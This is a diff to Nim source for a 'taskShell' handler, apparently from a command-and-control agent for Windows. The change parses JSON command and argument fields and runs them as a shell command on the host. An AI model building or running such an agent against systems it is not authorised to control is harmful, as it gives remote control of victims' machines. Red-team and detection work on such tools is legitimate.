@@ -1,13 +1,19 @@
-import winim, osproc, strutils, strformat, base64
+import winim, osproc, strutils, strformat, base64, json
 
 import ../types
 
 proc taskShell*(task: Task): TaskResult = 
 
-    echo "Executing command: ", task.args.join(" ")
+    # Parse arguments JSON string to obtain specific values 
+    let 
+        params = parseJson(task.args)
+        command = params["command"].getStr()
+        arguments = params["arguments"].getStr()
+
+    echo fmt"Executing command {command} with arguments {arguments}"
 
     try: 
-        let (output, status) = execCmdEx(task.args.join(" ")) 
+        let (output, status) = execCmdEx(fmt("{command} {arguments}")) 
         return TaskResult(
             task: task.id, 
             agent: task.agent, 
